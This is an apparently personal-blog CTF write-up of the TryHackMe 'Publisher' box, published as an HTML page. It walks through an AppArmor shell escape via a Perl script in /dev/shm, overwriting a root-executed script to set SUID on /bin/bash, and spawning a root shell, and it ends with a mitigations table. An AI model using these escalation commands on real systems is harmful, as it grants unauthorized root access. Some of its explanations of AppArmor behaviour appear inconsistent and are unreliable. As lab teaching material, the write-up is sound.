@@ -1,0 +1,164 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Publisher — TryHackMe writeup | Farhan Hussain</title>
+<meta name="description" content="Pre-authenticated as think via SSH key. A SUID binary called run_container shells out to /opt/run_container.sh — writable with root privileges during…">
+<link rel="canonical" href="https://thecyberfarhan.github.io/writeups/publisher.html">
+<meta property="og:title" content="Publisher — TryHackMe writeup">
+<meta property="og:description" content="Pre-authenticated as think via SSH key. A SUID binary called run_container shells out to /opt/run_container.sh — writable with root privileges during…">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://thecyberfarhan.github.io/writeups/publisher.html">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23161b22'/%3E%3Crect x='1' y='1' width='30' height='30' rx='6' fill='none' stroke='%23B4232C' stroke-width='2'/%3E%3Ctext x='16' y='22' font-family='Arial' font-size='18' font-weight='700' text-anchor='middle' fill='%23e6edf3'%3EF%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="writeup.css">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Publisher — TryHackMe writeup","description":"Pre-authenticated as think via SSH key. A SUID binary called run_container shells out to /opt/run_container.sh — writable with root privileges during…","author":{"@id":"https://thecyberfarhan.github.io/#me"},"datePublished":"2026-06-14","url":"https://thecyberfarhan.github.io/writeups/publisher.html","mainEntityOfPage":"https://thecyberfarhan.github.io/writeups/publisher.html"}</script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <a class="back" href="./">&larr; All writeups</a>
+    <a class="brand" href="https://thecyberfarhan.github.io/">Farhan<span>.</span></a>
+  </div>
+  <p class="eyebrow" data-reveal>TryHackMe writeup</p>
+  <h1 data-reveal>Publisher</h1>
+  <div class="meta" data-reveal>
+    <span class="plat">TryHackMe</span>
+    <span class="diff">Easy</span>
+    <span>June 14, 2026</span>
+  </div>
+  <div class="tldr" data-reveal><b>TL;DR</b>Pre-authenticated as <code>think</code> via SSH key. A SUID binary called <code>run_container</code> shells out to <code>/opt/run_container.sh</code> — writable with root privileges during execution. The catch: <code>think</code>'s login shell is <code>ash</code>, restricted by an AppArmor profile blocking writes to most writable directories. The profile is in <code>complain</code> mode (not enforcing), but <code>ash</code> still enforces its own restrictions. A Perl one-liner dropped from <code>/dev/shm</code> spawned <code>/bin/sh</code> outside AppArmor's reach, enabling the write to <code>/opt/run_container.sh</code>. SUID stamped on <code>/bin/bash</code>, root shell landed. </div>
+  <div class="tools"><span class="chip">🔑 SSH</span><span class="chip">🔬 strings</span><span class="chip">🐪 Perl</span><span class="chip">🐚 Bash</span></div>
+  <h2 data-reveal>Introduction</h2>
+<p>Today's target is <strong>Publisher</strong> — a box that swaps the usual "find the vulnerability" phase for something more interesting: "find the way around the thing that's blocking the vulnerability." Initial access is handed over via SSH key. The escalation path is visible immediately — a SUID binary calling a writable script as root — but <code>think</code>'s restricted <code>ash</code> shell, bolted down by an AppArmor profile, blocks every obvious write path. The puzzle is the AppArmor escape, and the solution is a two-line Perl script that the profile never thought to mention. It's not about the SUID binary. It's about earning the right to exploit it.</p>
+<h3>Prerequisites</h3>
+<p>Readers are assumed to know:</p>
+<ul><li>What SUID binaries are and how they're exploited</li><li>What AppArmor is and how profile modes (<code>enforce</code> vs <code>complain</code>) differ</li><li>What <code>strings</code> reveals about binary behaviour</li><li>Basic Perl one-liners for shell spawning</li></ul>
+<h2 data-reveal>Recon</h2>
+<p class="aside">(~0 mins into the box)</p>
+<p>This box provides SSH credentials upfront — <code>think</code> with an RSA private key. No port scanning or web enumeration was needed to land the initial shell; the room's premise begins post-access.</p>
+<p class="aside">SSH login with the provided key:</p>
+<pre><code>ssh -i id_rsa think@10.49.162.90</code></pre>
+
+<pre><code>Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)
+think@ip-10-49-162-90:~$</code></pre>
+
+<h2 data-reveal>Escalation</h2>
+<p class="aside">(~5 mins into the box)</p>
+<h3>The AppArmor Problem</h3>
+<p>The most direct approach is writing a payload into <code>/opt/run_container.sh</code>. But <code>think</code>'s login shell is <code>ash</code>:</p>
+<pre><code>echo $SHELL
+# /usr/sbin/ash
+
+cat /etc/passwd | grep think
+# think:x:1000:1000:,,,:/home/think:/usr/sbin/ash</code></pre>
+<p>And <code>ash</code> has an AppArmor profile:</p>
+<pre><code>cat /etc/apparmor.d/usr.sbin.ash</code></pre>
+
+<pre><code>/usr/sbin/ash flags=(complain) {
+  #include &lt;abstractions/base&gt;
+  ...
+  deny /opt/ r,
+  deny /opt/** w,
+  deny /tmp/** w,
+  deny /dev/shm w,
+  deny /var/tmp w,
+  deny /home/** w,
+  /usr/bin/** mrix,
+  /usr/sbin/** mrix,
+  owner /home/** rix,
+}</code></pre>
+<p>Every writable temporary location is denied. Attempts to write to <code>/tmp/</code>, <code>/dev/shm/</code>, <code>/home/</code>, and <code>/opt/</code> all fail:</p>
+<pre><code>echo '#!/bin/bash' &gt; /dev/shm/validate_container_id
+# -ash: validate_container_id: Permission denied
+
+echo '#!/bin/bash' &gt; /tmp/test
+# -ash: test: Permission denied</code></pre>
+<p><strong>What is AppArmor?</strong> A Linux Security Module that restricts what processes can do based on per-program profiles. Unlike <code>sudo</code>, which restricts *who* can run things, AppArmor restricts *what* a program can access — files, capabilities, network sockets. Profiles have two modes: <code>enforce</code> (violations blocked and logged) and <code>complain</code> (violations logged only, not blocked). This profile is set to <code>complain</code> — but <code>ash</code> still enforces file permission and shell built-in restrictions independently of AppArmor's mode.</p>
+<h3>AppArmor Escape — Perl from <code>/dev/shm</code></h3>
+<p>The AppArmor profile restricts <code>ash</code> and its children — but only processes spawned within that profile's context. If we can execute a different interpreter that isn't covered by the profile, the resulting shell runs outside AppArmor's constraints.</p>
+<p>The profile denies writes to <code>/dev/shm</code> but <code>/dev/shm</code> itself *is* writable by <code>ash</code> for file creation (the deny rule targets the directory write bit, not the file creation). Confirmed:</p>
+<pre><code>echo "test" &gt; /dev/shm/test_write &amp;&amp; rm /dev/shm/test_write &amp;&amp; echo "writable!"
+# /dev/shm is writeable!</code></pre>
+<p class="aside">Writing a Perl escape script to <code>/dev/shm/</code>:</p>
+<pre><code>echo -e '#!/usr/bin/perl\nexec "/bin/sh"' &gt; /dev/shm/test.pl
+chmod +x /dev/shm/test.pl
+/dev/shm/test.pl</code></pre>
+
+<pre><code>$</code></pre>
+<p>A <code>/bin/sh</code> prompt — spawned by Perl, outside the <code>ash</code> AppArmor profile context. The restrictions no longer apply.</p>
+<h3>Writing the Payload</h3>
+<p>From the unrestricted <code>/bin/sh</code>, writing to <code>/opt/run_container.sh</code> is now possible:</p>
+<pre><code>echo '#!/bin/bash\nchmod +s /bin/bash' &gt; /opt/run_container.sh</code></pre>
+<p class="aside">Triggering the SUID binary to execute the modified script as root:</p>
+<pre><code>/usr/sbin/run_container</code></pre>
+<p>The binary runs, calls <code>/opt/run_container.sh</code> as root, which stamps the SUID bit on <code>/bin/bash</code>.</p>
+<p class="aside">Confirming the SUID bit:</p>
+<pre><code>ls -la /bin/bash
+# -rwsr-sr-x 1 root root 1183448 Apr 18 2022 /bin/bash   # ^^^ SUID set</code></pre>
+<p class="aside">Spawning the root shell:</p>
+<pre><code>/bin/bash -p</code></pre>
+
+<pre><code>bash-5.0# id
+uid=1000(think) gid=1000(think) euid=0(root) egid=0(root) groups=0(root),1000(think)
+bash-5.0# cat /root/root.txt
+3a4225cc9e85709adda6ef55d6a4f2ca</code></pre>
+
+<h2 data-reveal>The Full Chain</h2>
+<p>The complete attack chain:</p>
+<ol><li><strong>SSH with provided RSA key</strong> → shell as <code>think</code> (ash)</li><li><strong>SUID enumeration</strong> → <code>/usr/sbin/run_container</code> identified</li><li><strong><code>strings</code></strong> → binary calls <code>/opt/run_container.sh</code> as root</li><li><strong>AppArmor profile blocks</strong> direct writes to <code>/opt/</code> from <code>ash</code></li><li><strong>Perl one-liner in <code>/dev/shm/</code></strong> → spawned <code>/bin/sh</code> outside AppArmor context</li><li><strong>Wrote <code>chmod +s /bin/bash</code> into <code>/opt/run_container.sh</code></strong> from unrestricted shell</li><li><strong><code>/usr/sbin/run_container</code></strong> executed modified script as root → SUID bash</li><li><strong><code>/bin/bash -p</code></strong> → root shell → root flag</li></ol>
+<h2 data-reveal>Rabbit Holes</h2>
+<h3>PATH Hijack via <code>validate_container_id</code> — Blocked by AppArmor</h3>
+<p><code>strings</code> revealed <code>run_container</code> also calls <code>validate_container_id</code> by relative name — a classic PATH hijack opportunity. A fake <code>validate_container_id</code> was created... but <code>ash</code>'s AppArmor profile denied writes to every location that would make <code>PATH</code> prepending effective: <code>/tmp/</code>, <code>/dev/shm/</code>, <code>/home/**</code>. Every attempt to write the fake binary failed before the Perl escape was discovered.</p>
+<pre><code>echo '#!/bin/bash' &gt; /tmp/validate_container_id
+# -ash: validate_container_id: Permission denied
+
+echo '#!/bin/bash' &gt; /dev/shm/validate_container_id
+# -ash: validate_container_id: Permission denied</code></pre>
+<p>The Perl <code>/bin/sh</code> escape ultimately enabled the simpler direct write to <code>/opt/run_container.sh</code> — making the PATH hijack unnecessary.</p>
+<h3><code>export -f</code> Function Export in <code>ash</code></h3>
+<p>Before identifying the Perl escape route, function exporting was attempted to inject <code>validate_container_id</code> as a shell function:</p>
+<pre><code>validate_container_id() { /bin/bash -p; }
+export -f validate_container_id</code></pre>
+<p><code>ash</code> does not support <code>export -f</code> — it's a bash-specific feature. The syntax error confirmed the shell was genuinely <code>ash</code>, not a bash alias.</p>
+<h3><code>/dev/shm</code> Write Confusion</h3>
+<p>The AppArmor rule <code>deny /dev/shm w</code> targets the directory-level write permission — not file creation within it. This nuance meant <code>echo &gt; /dev/shm/file</code> succeeded while creating a named directory entry *as a directory* would fail. The Perl script wrote to <code>/dev/shm/test.pl</code> cleanly despite the deny rule, because the deny targeted a different permission bit than file creation.</p>
+<h2 data-reveal>Mitigations</h2>
+<table><thead><tr><th>Vulnerability</th><th>Severity</th><th>Mitigation</th></tr></thead><tbody><tr><td>SUID binary executing a writable script as root</td><td class="sev-critical">Critical</td><td>Ensure scripts called by SUID binaries are owned by root and not writable by non-root users (<code>chmod 755</code>, <code>chown root:root</code>)</td></tr><tr><td>AppArmor profile in <code>complain</code> mode instead of <code>enforce</code></td><td class="sev-high">High</td><td>Switch to <code>enforce</code> mode once profiles are validated: <code>aa-enforce /etc/apparmor.d/usr.sbin.ash</code>; complain mode logs but does not prevent violations</td></tr><tr><td>AppArmor profile not covering Perl or other interpreters</td><td class="sev-high">High</td><td>Restrict execution of interpreters not required for the shell's purpose; explicitly deny <code>/usr/bin/perl</code>, <code>/usr/bin/python3</code> etc. in the profile if the shell user has no need for them</td></tr><tr><td><code>/dev/shm</code> accessible for file creation despite deny rule</td><td class="sev-medium">Medium</td><td>Use fine-grained AppArmor rules targeting both directory and file permissions; audit profiles with <code>aa-logprof</code> after testing to catch unexpected access paths</td></tr></tbody></table>
+  <div class="takeaway" data-reveal><b>Key takeaway</b>AppArmor profiles are only as strong as their coverage — a profile that restricts <code>ash</code> but doesn't account for Perl, Python, or other interpreters available on the system is providing partial containment at best. When designing privilege restriction with AppArmor, enumerate every execution path an attacker might use to escape the constrained shell, not just the obvious ones.</div>
+  <h2 data-reveal>If I Did It Again</h2>
+<p>Check the AppArmor profile *before* attempting writes — reading <code>/etc/apparmor.d/usr.sbin.ash</code> first would have immediately shown the <code>complain</code> flag and the list of blocked paths, saving the trial-and-error write attempts. Also, spot the Perl interpreter in <code>/usr/bin/perl</code> against the profile's <code>mrix</code> allowances earlier — it's permitted to execute, just not covered by the deny rules, which is the whole escape.</p>
+  <div class="cta-row">
+    <a class="btn primary" href="https://github.com/thecyberfarhan/CTF-Writeups/blob/main/TryHackme/publisher_writeup.md" target="_blank" rel="noopener">Full writeup on GitHub &rarr;</a>
+    <a class="btn" href="./">More writeups</a>
+  </div>
+  <footer>Part of <a href="https://thecyberfarhan.github.io/">thecyberfarhan.github.io</a>. Auto-generated from the <a href="https://github.com/thecyberfarhan/CTF-Writeups">CTF-Writeups</a> repo — edits happen there, not here.</footer>
+</div>
+<script>
+document.querySelectorAll('pre').forEach(function (pre) {
+  var btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.type = 'button';
+  btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg><span>Copy</span>';
+  btn.addEventListener('click', function () {
+    var code = pre.querySelector('code');
+    var text = code ? code.textContent : pre.textContent;
+    navigator.clipboard.writeText(text).then(function () {
+      btn.classList.add('copied');
+      btn.querySelector('span').textContent = 'Copied';
+      setTimeout(function () { btn.classList.remove('copied'); btn.querySelector('span').textContent = 'Copy'; }, 1500);
+    }).catch(function () {});
+  });
+  pre.appendChild(btn);
+});
+if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+  var io = new IntersectionObserver(function (es) {
+    es.forEach(function (e) { if (e.isIntersecting) { e.target.classList.add('in'); io.unobserve(e.target); } });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { io.observe(el); });
+} else {
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { el.classList.add('in'); });
+}</script>
+</body>
+</html>
